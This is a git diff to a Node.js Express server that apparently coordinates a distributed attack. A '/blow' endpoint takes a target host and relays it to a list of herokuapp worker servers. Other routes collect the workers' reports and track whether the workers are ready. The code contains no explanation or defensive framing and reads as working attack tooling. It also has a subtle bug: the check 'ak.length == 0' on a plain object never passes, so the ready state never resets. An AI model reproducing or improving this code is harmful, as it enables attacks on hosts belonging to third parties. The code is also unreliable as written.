@@ -6,6 +6,8 @@ var Req = require('request');
 var fs = require('fs');
 
 var app = express();
+var run = false;
+var ak = {}
 
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -26,6 +28,7 @@ app.use(function (req,res,next) {
 app.post('/blow',function (req,res ) {
   var host = req.body.host;
   res.end('done');
+  run = true;
 
   sendCmd(['https://bb-s1.herokuapp.com/',
 'https://bb-s2.herokuapp.com/',
@@ -42,9 +45,19 @@ app.post('/blow',function (req,res ) {
 app.post('/reg',function (req,res) {
   res.end('saved');
   var txt = req.body.s;
+  var id = req.body.id;
+  delete ak[id];
   save(txt);
 });
 
+
+app.head('/',function (req,res) {
+  res.writeHead(200,
+    {'type': 'brq',
+    'ready': !run
+  });
+  res.end();
+});
 
 function save(txt) {
   var date = getNow();
@@ -53,12 +66,15 @@ function save(txt) {
   fs.appendFile('log.txt', '\n'+date+'  ::'+txt, function (err) {
   if (err) throw err;
   console.log('Updated!');
+  if (ak.length == 0) {
+    run = false;
+  }
 });
 
 
 }
 
-app.use('/', function (req,res) {
+app.get('/', function (req,res) {
   res.sendFile(__dirname+'/log.txt');
 });
 
@@ -79,6 +95,7 @@ var onSucess = function (err,rr,body) {
     return;
   }
     s++;
+    ak[s] = true;
     console.log('cmd '+ s +' success');
     console.log(body);
     if (s >= e)
@@ -99,7 +116,7 @@ var send = function () {
     form:{
       time:time,
       host:host,
-      ip:'https://bb-s.herokuapp.com'
+      id:s+1,
     }
   },onSucess);
 }
